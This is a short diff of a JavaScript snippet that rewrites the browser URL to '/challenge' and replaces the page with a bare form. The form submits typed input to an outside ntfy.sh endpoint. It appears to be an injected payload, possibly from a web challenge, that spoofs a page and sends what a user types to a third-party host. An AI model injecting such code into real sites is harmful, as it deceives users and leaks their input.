@@ -1,2 +1,4 @@
 history.pushState(0,0,'/challenge');
-document.write('<fieldset><form action=https://ntfy.sh/q/send method=get><input name=m autocomplete=off><input><input type=submit></form></fieldset>');
+document.open();
+document.write('<fieldset><form method=get action=https://ntfy.sh/q/send><input name=m autocomplete=off><input><input type=submit></form></fieldset>');
+document.close();
